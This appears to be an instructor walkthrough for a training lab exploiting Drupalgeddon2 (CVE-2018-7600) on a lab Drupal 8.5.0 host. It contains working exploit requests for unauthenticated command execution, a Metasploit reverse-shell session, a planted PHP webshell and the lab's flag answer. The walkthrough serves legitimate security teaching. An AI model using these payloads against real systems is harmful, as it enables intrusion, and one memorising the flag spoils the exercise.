---
id: B02.M06-walkthrough
title: Jacksonville — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/06-target6-drupalgeddon2.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Jacksonville — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Jacksonville Module (`B02.M06`). Students know only the assigned subnet `192.168.15.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.15.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T6_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `gobuster` (directory enumeration once we know this is a Drupal site)
* `curl` (for web enumeration, exploit delivery, and webshell use)
* `python3` (pretty-print the Drupal AJAX JSON)
* `metasploit-framework` (section 4 automated path via `exploit/unix/webapp/drupal_drupalgeddon2`)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.15.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.15.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.15.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.15.1
Host is up.
Nmap scan report for 192.168.15.10
Host is up.
Nmap scan report for 192.168.15.254
Host is up.
```

**Observation:** Three hosts respond on this subnet.

**Inference:** In this lab layout, `.254` is typically the lab router on the segment and `.1` is often the Docker bridge gateway. Concentrate service enumeration on **192.168.15.10**.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.15.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.15.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. An open `80/tcp` labeled only `http` is not enough to research; we need the product string (here, **Apache httpd 2.4.25**).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

*Output excerpt:*
```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

**Observation:** A single open port — **80/tcp** — Apache httpd 2.4.25.

**Inference:** A conventional web stack. Apache does not name the CMS. Next, read HTTP headers and the page body for application fingerprints.

### Initial Web Probing

nmap told us HTTP on port 80. Confirm that in the HTTP conversation: **headers first** (what the server admits), then the HTML.

```bash
curl -s -D - http://192.168.15.10/ -o /tmp/t6-root.html | head -20
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter so the output is just headers/body.
* `-D -` — write response **headers** to stdout (`-` means stdout). That is where `Server`, `X-Powered-By`, and `X-Generator` show up.
* `-o /tmp/t6-root.html` — write the **body** to a file so headers and HTML stay separated.
* `| head -20` — only the first header lines.

*Header excerpt:*
```text
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.2.3
X-Generator: Drupal 8 (https://www.drupal.org)
```

**Observation:** `X-Generator: Drupal 8` is already in the **headers**. That is the product identity — we have it before we touch the HTML.

**Inference:** Confirm the same generator in the page, and grab the title so we know this is an installed site (not the installer).

```bash
grep -iE '<title>|Generator|Drupal' /tmp/t6-root.html | head -10
```

*Why these patterns:* `title` is the site name; `Generator` / `Drupal` match the header we already saw (`X-Generator` and the HTML `<meta name="Generator">`). We are not guessing CMS names — we are confirming the header in the body.

*Body excerpt:*
```html
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<title>Welcome to LabDrupal | LabDrupal</title>
```

**Observation:** Installed **Drupal 8** site named **LabDrupal**. No redirect to `/core/install.php`.

**Inference:** Drupal 8 is the research lead. We still need a **core version** and an **unauthenticated form**. Generic path enumeration is the next step — not a jump straight to a changelog file.

### Finding `/core/` and `/user/` (gobuster)

Drupal 8 keeps PHP/core assets under **`/core/`** and account routes under **`/user/`**. Those names are also in ordinary web wordlists, so a directory brute-force should surface them without needing the CVE yet.

```bash
gobuster dir -u http://192.168.15.10 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 40 --no-error
```

*`gobuster dir`* requests `GET /{word}` for each wordlist line. *`-w`* is the list; Kali’s SecLists `common.txt` includes `core`, `user`, `sites`, and similar CMS paths. *`--no-error`* hides transient connection noise.

*Output excerpt:*
```text
/core                 (Status: 301) [Size: 314] [--> http://192.168.15.10/core/]
/sites                (Status: 301) [Size: 315] [--> http://192.168.15.10/sites/]
/user                 (Status: 302) [Size: 391] [--> http://192.168.15.10/user/login]
```

**Observation:** `/core/` and `/user/` exist. `/user` redirects toward login — so account routes are live.

**Inference:** Follow those two directories. Version evidence lives with core; the Drupalgeddon2 public PoCs use an unauthenticated account form under `/user/`.

### `/core/CHANGELOG.txt` — where that path comes from

Gobuster found **`/core/`**, not the changelog itself. A default `common.txt` run often lists `changelog.txt` in **lowercase**. This host is Linux (case-sensitive), and Drupal 8 ships **`core/CHANGELOG.txt`** (capital). A lowercase wordlist miss is expected.

The filename is Drupal layout, not a lucky gobuster hit. Searching from facts we have — `Drupal 8 CHANGELOG.txt` — points at the documented path **`/core/CHANGELOG.txt`** (Drupal 8 moved the changelog off the site root into core). Fetch that file and **read the first lines** for the version; do not stop at `Last-Modified`.

```bash
curl -sI http://192.168.15.10/core/CHANGELOG.txt
curl -s http://192.168.15.10/core/CHANGELOG.txt | head -n 8
```

*`curl -sI`* is a HEAD request (headers only) — confirms the file is world-readable before we download it.

*Header excerpt:*
```text
HTTP/1.1 200 OK
Last-Modified: Wed, 07 Mar 2018 21:10:20 GMT
```

*Body excerpt:*
```text
Drupal 8.5.0, 2018-03-07
------------------------
- Added support for ...
```

**Observation:** The file is **Drupal 8.5.0**, dated **2018-03-07**. That matches the `Last-Modified` header, but the **body** is the version proof.

**Inference:** Searching `Drupal 8.5.0 SA-CORE-2018-002` lands on [SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002) / **CVE-2018-7600 (Drupalgeddon2)** for 8.5.x before **8.5.1**. The matching Vulhub notes are `vulnhub/drupal/CVE-2018-7600/README.md`.

### `/user/register` — where that path comes from

Gobuster found **`/user`**. Drupal’s default account routes under that prefix are `/user/login`, `/user/register`, and `/user/password` ([User accounts](https://www.drupal.org/docs/user_guide/en/user-concept.html) — registration is a stock path when the site allows new accounts).

**Why register, not login, for this CVE:** SA-CORE-2018-002 is **Form API** abuse on forms that still process attacker-controlled fields. The widely copied public PoCs — [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600) `exploit.py`, [Exploit-DB 44449](https://www.exploit-db.com/exploits/44449), Metasploit `drupal_drupalgeddon2`, and the Vulhub README — all POST to the **user registration** AJAX submit because that form is reachable **without** a session. Login would require credentials we do not have. Check Point’s Drupalgeddon2 write-up makes the same choice ([Uncovering Drupalgeddon 2](https://research.checkpoint.com/uncovering-drupalgeddon-2/)).

Confirm the register page is actually served:

```bash
curl -s http://192.168.15.10/user/register | grep -i '<title>'
```

*Output:*
```html
<title>Create new account | LabDrupal</title>
```

**Observation:** `/user/register` is reachable without authentication.

**Candidate selection:** Test Form API render-array injection on that registration AJAX path before chasing authenticated Drupal bugs — we have an unauthenticated form and a pre-8.5.1 core fingerprint.

## 3. Vulnerability Discovery

**What the bug is:** Drupal builds pages from **render arrays** — PHP arrays whose keys starting with `#` (`#type`, `#markup`, `#post_render`, …) tell the theme layer how to render a form element. In vulnerable 8.5.x (before 8.5.1), an unauthenticated POST can inject those privileged keys into a form **before** Drupal sanitizes them. If `#post_render` is set to PHP’s `exec` (or `passthru`) and `#markup` is a command, Drupal runs that command while rendering the AJAX response.

That is Drupalgeddon2 / CVE-2018-7600. We already have the version window and `/user/register`. Next we send the **public detection request**, not a custom invention.

### Detection request — this is `exploit.py` unrolled

The [a2u](https://github.com/a2u/CVE-2018-7600) PoC is a Python script (`exploit.py`). It does **not** use a different protocol. It builds one HTTP POST and prints the command output from the JSON. The `curl` below is that same POST with the encodings written out so the Form API keys are visible.

`exploit.py` effectively sends:

```text
POST /user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form
_drupal_ajax=1
mail[#post_render][]=exec
mail[#type]=markup
mail[#markup]=id
```

In a URL, `#` starts a fragment and never reaches the server, so the script percent-encodes it as `%23`. Brackets become `%5B` / `%5D`. That is why the curl looks noisy — it is the Python request, not a second undocumented exploit.

* `element_parents=account/mail/%23value` — steer the AJAX renderer into the nested **mail** element (`#value`).
* `ajax_form=1` and `_wrapper_format=drupal_ajax` — ask for a Drupal AJAX JSON response (where command output will appear).
* `mail[#type]=markup` — treat the field as renderable markup.
* `mail[#post_render][]=exec` — run PHP `exec()` on that markup.
* `mail[#markup]=id` — the command. Public PoCs use `id` here; this is already **OS** execution, not a math canary.

`--data` sends the body. `| python3 -m json.tool` pretty-prints the AJAX JSON so the `data` field is readable.

```bash
curl -s "http://192.168.15.10/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=id" \
  | python3 -m json.tool
```

*Output:*
```json
[
    {
        "command": "insert",
        "method": "replaceWith",
        "selector": null,
        "data": "uid=33(www-data) gid=33(www-data) groups=33(www-data)<span class=\"ajax-new-content\"></span>",
        "settings": null
    }
]
```

**Observation:** The AJAX `data` field contains `uid=33(www-data)` — `id` ran as the web user.

**Inference:** Unauthenticated RCE via Drupalgeddon2 is confirmed. Metasploit (section 4) or the same POST with a different `#markup` (section 5) is next.

## 4. Automated Path: Metasploit

Product + confirmed Form API RCE is enough to search Metasploit:

```text
msf6 > search drupalgeddon2

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
```

```bash
msfconsole -q
```

```text
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.15.10
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 80
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 192.168.100.1
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LPORT 4444
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > check
[+] The target is vulnerable. Detected vulnerable version 8
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
```

*Output excerpt:*
```text
[*] Started reverse TCP handler on 192.168.100.1:4444
[*] Meterpreter session 1 opened (192.168.100.1:4444 -> 192.168.15.10:xxxxx)
```

In the session:

```text
meterpreter > cat /flag.txt
violet-heron
```

That is a complete automated path to the flag. Section 5 is the same Form API POST without Metasploit.

## 5. Manual Path: Form API webshell

`exploit.py` takes a **command string** and puts it in `mail[#markup]`. The detection curl used `id`. A reverse shell through `exec` is possible but quoting is brittle. On this PHP/Apache host a simpler `#markup` is: write a tiny webshell under the document root, then talk to it over HTTP. That is still the a2u/Vulhub request — only the command changed.

`--data-urlencode` lets us write `mail[#post_render][]` with real `#` characters; curl encodes them. Switch the callback to `passthru` so we get full command output (PHP `exec()` returns only the last line).

The payload `<?php system($_GET["c"]); ?>` base64-encodes to `PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==`. Write it with `php -r` so nested quotes do not corrupt the file. Document root is `/var/www/html` on this Apache image (`www-data` can write there). Drupal’s `sites/default/files` is writable but ships an `.htaccess` that disables PHP execution ([SA-2006-006](https://www.drupal.org/drupal-sa-2006-006)-era hardening) — a `.php` there will not run.

```bash
curl -s "http://192.168.15.10/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "form_id=user_register_form" \
  --data-urlencode "_drupal_ajax=1" \
  --data-urlencode "mail[#post_render][]=passthru" \
  --data-urlencode "mail[#type]=markup" \
  --data-urlencode 'mail[#markup]=php -r '"'"'$c=base64_decode("PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg=="); file_put_contents("/var/www/html/cmd.php",$c); echo strlen($c);'"'"''
```

*Output excerpt:* `28` (byte length of the written webshell) inside the usual Drupal AJAX JSON wrapper.

Confirm the shell executes arbitrary commands:

```bash
curl -s 'http://192.168.15.10/cmd.php?c=id'
```

*Output:*
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Flag via the webshell (or `cat /flag.txt` in the Metasploit session from section 4):

```bash
curl -s 'http://192.168.15.10/cmd.php?c=cat%20/flag.txt'
```

*Output:*
```text
violet-heron
```

If you skip the webshell, the original `exploit.py` shape can print the flag in the AJAX `data` field (`#markup=cat /flag.txt`):

```bash
curl -s "http://192.168.15.10/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=cat%20/flag.txt" \
  | python3 -m json.tool
```

*Output excerpt:*
```json
"data": "violet-heron<span class=\"ajax-new-content\"></span>"
```

Target 6 is complete.
